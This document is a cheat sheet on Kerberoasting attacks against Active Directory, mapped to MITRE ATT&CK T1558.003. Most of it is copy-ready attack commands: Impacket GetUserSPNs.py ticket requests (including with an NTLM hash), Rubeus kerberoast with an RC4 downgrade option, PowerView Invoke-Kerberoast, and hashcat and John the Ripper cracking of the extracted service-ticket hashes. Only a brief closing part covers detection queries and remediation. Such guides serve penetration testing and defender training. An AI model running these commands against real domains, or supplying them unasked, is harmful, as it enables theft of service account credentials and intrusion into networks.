# API Reference: Kerberoasting with Impacket

## MITRE ATT&CK T1558.003 — Kerberoasting

### Attack Flow
1. Authenticate to AD with domain user credentials
2. Query LDAP for accounts with SPNs
3. Request TGS tickets for those SPNs
4. Extract ticket hashes
5. Crack offline with wordlist

## Impacket — GetUserSPNs.py

### Enumerate SPN Accounts
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1
```

### Request TGS Tickets
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 \
    -request -outputfile kerberoast.txt
```

### With NTLM Hash
```bash
GetUserSPNs.py domain.local/user -hashes :NTLM_HASH -dc-ip 10.10.10.1 -request
```

### Output Format (Hashcat mode 13100)
```
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$...$<hash>
```

## Rubeus — Windows Kerberoasting

### Kerberoast All SPNs
```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
```

### Target Specific User
```cmd
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt
```

### RC4 Only (weaker, easier to crack)
```cmd
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
```

## Hash Cracking

### Hashcat
```bash
# Kerberos 5 TGS-REP etype 23 (RC4)
hashcat -m 13100 hashes.txt wordlist.txt

# Kerberos 5 TGS-REP etype 17 (AES-128)
hashcat -m 19600 hashes.txt wordlist.txt

# Kerberos 5 TGS-REP etype 18 (AES-256)
hashcat -m 19700 hashes.txt wordlist.txt
```

### John the Ripper
```bash
john --wordlist=wordlist.txt hashes.txt
```

## PowerShell Enumeration

### Find SPN Accounts
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, PasswordLastSet
```

### Request TGS (PowerView)
```powershell
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash
```

## Detection

### Event IDs
| Event | Description |
|-------|-------------|
| 4769 | Kerberos Service Ticket Request |
| 4770 | Service Ticket Renewed |

### Detection Query
```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4
| where ServiceName !endswith "$"
| summarize count() by Account, ServiceName
```

## Remediation
1. Use Group Managed Service Accounts (gMSA)
2. Set strong passwords (25+ characters) on SPN accounts
3. Enable AES encryption for Kerberos (disable RC4)
4. Monitor Event 4769 for anomalous TGS requests
